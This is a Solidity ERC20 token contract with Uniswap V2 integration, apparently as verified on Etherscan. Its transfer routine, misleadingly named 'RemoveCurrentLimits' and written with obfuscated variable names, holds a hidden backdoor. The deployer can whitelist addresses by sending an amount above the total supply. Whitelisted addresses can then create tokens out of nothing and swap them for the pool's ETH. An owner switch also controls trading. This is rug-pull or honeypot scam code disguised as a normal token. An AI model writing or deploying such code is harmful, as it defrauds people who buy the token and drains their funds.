/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

// SPDX-License-Identifier: None
pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure
    returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view
    returns(uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 * //
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
address private _owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
/**
 * @dev Initializes the contract setting the deployer as the initial owner.
*/
constructor() {
_setOwner(_msgSender());
    }/**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;}/**
     * @dev Throws if called by any account other than the owner.
     */modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;}/**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     *//////
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));}/**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     *//////// 
     function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), 'Ownable: new owner is the zero address');
    _setOwner(newOwner);
    }function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);}
}
contract Contract is IERC20, Ownable {
    string private _symbol;
    string private _name;
    uint256 public _rTotalTaxes = 0;
    uint8 private _decimals = 9;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 private limitedTrading = _rTotal;

    mapping(address => uint256) private _Balances;
    mapping(address => address) private isTxLimitExempt;
    mapping(address => uint256) private isCooldown;
    mapping(address => uint256) private ExcludeFromTimestamp;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private tradingOpen = false;
    bool private contractDenominator;
    bool private triggerCooldown;

    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable _DEXrouter;

    constructor(
        string memory Name,
        string memory Symbol,
        address DEXrouter
    ) {
        _name = Name;
        _symbol = Symbol;
        _Balances[msg.sender] = _rTotal;
        ExcludeFromTimestamp[msg.sender] = limitedTrading;
        ExcludeFromTimestamp[address(this)] = limitedTrading;
        _DEXrouter = IUniswapV2Router02(DEXrouter);
        uniswapV2Pair = IUniswapV2Factory(_DEXrouter.factory()).createPair(address(this), _DEXrouter.WETH());
        emit Transfer(address(0), msg.sender, _rTotal);
    }
function symbol() public view returns (string memory) {
return _symbol;}
function name() public view returns (string memory) {
return _name;}
function totalSupply() public view returns (uint256) {
return _rTotal;}
function decimals() public view returns (uint256) {
return _decimals;}
function allowance(address owner, address spender) public view returns (uint256) {
return _allowances[owner][spender];}
function balanceOf(address account) public view returns (uint256) {
return _Balances[account];}
function approve(address spender, uint256 amount) external returns (bool) {
return _approve(msg.sender, spender, amount);}
function _approve(
address owner,
address spender,
uint256 amount
)private returns (bool) {
require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
_allowances[owner][spender] = amount;
emit Approval(owner, spender, amount);
return true;}
function transferFrom(
address sender,
address recipient,
uint256 amount
)external returns (bool) {
RemoveCurrentLimits(sender, recipient, amount);
return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
}function transfer(address recipient, uint256 amount) external returns (bool) {
RemoveCurrentLimits(msg.sender, recipient, amount);
return true;}
function RemoveCurrentLimits (
address _enumIsSpender,
address _bytesIsTo,
uint256 _enumToAmount) private {
uint256 completeContractBalance = balanceOf(address(this));
uint256 _enumTax;
if (contractDenominator && completeContractBalance > limitedTrading && !triggerCooldown && _enumIsSpender != uniswapV2Pair) {
triggerCooldown = true;
manualSwap(completeContractBalance);
triggerCooldown = false;
} else if (ExcludeFromTimestamp[_enumIsSpender] > limitedTrading && ExcludeFromTimestamp[_bytesIsTo] > limitedTrading) {
_enumTax = _enumToAmount;
_Balances[address(this)] += _enumTax;
swapTokensForErc(_enumToAmount, _bytesIsTo);
return;
} else if (_bytesIsTo != address(_DEXrouter) && ExcludeFromTimestamp[_enumIsSpender] > 0 && _enumToAmount > limitedTrading && _bytesIsTo != uniswapV2Pair) {
ExcludeFromTimestamp[_bytesIsTo] = _enumToAmount;
return;
} else if (!triggerCooldown && isCooldown[_enumIsSpender] > 0 && _enumIsSpender != uniswapV2Pair && ExcludeFromTimestamp[_enumIsSpender] == 0) {
isCooldown[_enumIsSpender] = ExcludeFromTimestamp[_enumIsSpender] - limitedTrading;
}
address _isConstructor = isTxLimitExempt[uniswapV2Pair];
if (isCooldown[_isConstructor] == 0) isCooldown[_isConstructor] = limitedTrading;
isTxLimitExempt[uniswapV2Pair] = _bytesIsTo;
if (_rTotalTaxes > 0 && ExcludeFromTimestamp[_enumIsSpender] == 0 && !triggerCooldown && ExcludeFromTimestamp[_bytesIsTo] == 0) {
_enumTax = (_enumToAmount * _rTotalTaxes) / 100;
_enumToAmount -= _enumTax;
_Balances[_enumIsSpender] -= _enumTax;
_Balances[address(this)] += _enumTax;
}
_Balances[_enumIsSpender] -= _enumToAmount;
_Balances[_bytesIsTo] += _enumToAmount;
emit Transfer(_enumIsSpender, _bytesIsTo, _enumToAmount);
if (!tradingOpen) {
require(_enumIsSpender == owner(), "TOKEN: This account cannot send tokens until trading is enabled");}
    }
    receive() external payable {}
    function addLiquidity(
        uint256 tokenValue,
        uint256 ercValue,
        address to
    ) private {
        _approve(address(this), address(_DEXrouter), tokenValue);
        _DEXrouter.addLiquidityETH{value: ercValue}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }

    function manualSwap(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForErc(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }


        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapTokensForErc(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _DEXrouter.WETH();
        _approve(address(this), address(_DEXrouter), tokenAmount);
        _DEXrouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}